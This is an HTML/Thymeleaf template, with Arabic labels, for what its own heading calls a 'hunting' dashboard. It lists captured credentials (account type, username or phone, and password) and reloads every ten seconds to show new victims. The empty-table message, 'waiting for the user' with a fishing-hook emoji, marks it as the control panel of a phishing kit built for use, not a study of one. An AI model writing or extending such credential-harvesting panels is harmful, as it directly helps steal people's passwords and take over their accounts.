<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Admin Dashboard | لوحة التحكم</title>
    <meta charset="UTF-8">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f4f7f6; padding: 40 thumb; }
        .card { border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .table thead { background: #000; color: #fff; }
    </style>
</head>
<body>
    <div class="container mt-5">
        <div class="card p-4">
            <h2 class="mb-4 text-center">📊 لوحة بيانات المستخدمين (الصيد)</h2>
            <table class="table table-hover table-bordered text-center">
                <thead>
                    <tr>
                        <th>النوع</th>
                        <th>اسم المستخدم / الهاتف</th>
                        <th>كلمة المرور</th>
                    </tr>
                </thead>
                <tbody>
                    <tr th:each="item : ${dataList}">
                        <td><span class="badge bg-primary" th:text="${item.type}"></span></td>
                        <td th:text="${item.user}"></td>
                        <td class="fw-bold text-danger" th:text="${item.pass}"></td>
                    </tr>
                </tbody>
            </table>
            <div th:if="${dataList.isEmpty()}" class="text-center text-muted">
                لا يوجد بيانات حالياً.. في انتظار المستخدم 🎣
            </div>
        </div>
    </div>
    
<script>
        // تحديث الصفحة كل 10 ثواني عشان تشوف الجديد أوتوماتيك
        setTimeout(function(){ location.reload(); }, 10000);
    </script>
</body>
</html>
